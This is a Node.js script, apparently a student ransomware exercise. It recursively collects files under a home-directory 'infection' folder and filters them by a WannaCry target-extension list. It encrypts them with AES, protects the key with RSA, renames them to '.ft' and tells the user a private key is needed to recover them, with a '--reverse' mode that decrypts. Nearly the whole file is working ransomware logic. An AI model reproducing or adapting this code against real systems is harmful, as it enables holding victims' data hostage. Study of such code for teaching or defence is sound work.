import yargs from "yargs";
import { readFile, access, constants } from "node:fs/promises";
import path from "node:path";
import fs from "fs";
import { wannaCryExtension } from "./wannaCryExtension.js";
import Chiffrement from "./crypto/Chiffrement.js";
import readlineSync from "node:readline";

const argv = yargs(process.argv.slice(2))
  .usage("--help | --version | --reverse <key> | --silent")
  .option("r", {
    alias: "reverse",
    describe: "Reverse the given key",
    type: "boolean",
  })
  .option("s", {
    alias: "silent",
    describe: "Silent mode",
    type: "boolean",
  })
  .help()
  .version()
  .alias("version", "v")
  .alias("help", "h").argv;
// console.log(argv)


function getAllFiles(res, dir, datas) {
  res.forEach((file) => {
    if (file.isDirectory()) {
      let newdir = path.join(dir, file.name);
      let test = fs.readdirSync(newdir, { withFileTypes: true });
      getAllFiles(test, newdir, datas);
    } else {
      datas.push(dir + '/' + file.name);
    }
  });
}

function encryptFile(chiffrement, datas) {
  chiffrement.createNewAESKey();
  datas.forEach((file) => {

    //encrypt file
    let content = fs.readFileSync(file);
    let contentEncrypted = chiffrement.aesEncryptWithIV(
      content.toString("utf8")
    );
    fs.writeFileSync(file, contentEncrypted);

    //rename file
    let ext = file.split(".").pop();
    if(ext != "ft")
      fs.renameSync(file, file + ".ft");

    //display
    if (!argv.silent) 
      console.log("file encrypted : ", file);
  });
}

function decryptFile(chiffrement, datas) {
  datas.forEach((file) => {

    //decrypt file
    let content = fs.readFileSync(file);
    let contentDecrypted = chiffrement.aesDecryptWithIV(content.toString('utf8'));
    fs.writeFileSync(file, contentDecrypted);
    
    //rename file
    let lastExt = file.split(".").slice(-2)[0];
    if(wannaCryExtension.includes(lastExt))
      fs.renameSync(file, file.slice(0, -3));

    //display
    if(!argv.silent)
      console.log("file decrypted : ", file);
  });
}

async function checkPrivateKeyFile(chiffrement) {
  return new Promise((resolve, reject) => {
    //check if private key file exist
    if(!fs.existsSync("crypto/rsa_private_key.pem")){
      console.error("private key file not found");
      process.exit(1);
    }
    try{
      chiffrement.decryptAESKey();
      resolve();
    }
    catch(e){
      console.error("bad key!");
      process.exit(1);
    }
  });
}

async function myScript() {
  try {
    const dir = path.join(process.env.HOME, "infection");
    let datas = [];

    //check access
    fs.access(dir, fs.constants.R_OK | fs.constants.W_OK, (err) => {
      if (err) {
        console.error(err);
        process.exit();
      }
    });

    // read dir
    let res = fs.readdirSync(dir, { withFileTypes: true });
    getAllFiles(res, dir, datas);
    
    let chiffrement = new Chiffrement();

    if (!argv.reverse) {
      // filter datas with targetExtension
      datas = datas.filter((e) => {
        let ext = e.split(".").pop();
        return wannaCryExtension.includes(ext);
      });

      // encrypt files
      if(datas.length == 0){
        console.log("All files are already encrypted");
        process.exit();
      }
      encryptFile(chiffrement, datas);
      chiffrement.encryptAesKey();
      console.log("All files encrypted, you need the private key to decrypt them");
      console.log("Insert it in crypto/rsa_private_key.pem, (present in crypto/key.txt)");
      console.log("Run the script with --reverse option or make decrypt")
    } 
    else {
      datas = datas.filter((e) => {
        let ext = e.split(".").slice(-2)[0];
        return wannaCryExtension.includes(ext);
      });
      await checkPrivateKeyFile(chiffrement);
      decryptFile(chiffrement, datas);
    }
  } catch (e) {
    console.error("error : ", e);
  }
}

myScript();
